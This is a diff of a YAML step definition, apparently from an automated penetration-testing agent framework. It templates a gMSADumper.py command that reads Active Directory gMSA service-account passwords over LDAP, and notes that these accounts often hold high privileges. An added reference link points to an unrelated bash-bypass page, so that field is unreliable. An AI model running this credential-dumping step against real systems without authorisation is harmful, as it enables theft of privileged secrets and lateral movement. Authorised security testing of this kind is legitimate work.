@@ -2,16 +2,20 @@ name: read_gmsa
 category: ad
 description: Read gMSA password via LDAP
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "python3 gMSADumper.py -u '{username}' -p '{password}' -d {domain} -l {target_ip}"
+command_template: python3 gMSADumper.py -u '{username}' -p '{password}' -d {domain}
+  -l {target_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "gMSA passwords auto-rotated, stored in msDS-ManagedPassword blob. Readable by principals in PrincipalsAllowedToRetrieveManagedPassword. Often service accounts with high privileges."
+mechanism: gMSA passwords auto-rotated, stored in msDS-ManagedPassword blob. Readable
+  by principals in PrincipalsAllowedToRetrieveManagedPassword. Often service accounts
+  with high privileges.
+hacktricks_ref: linux-hardening/bypass-bash-restrictions/README.md
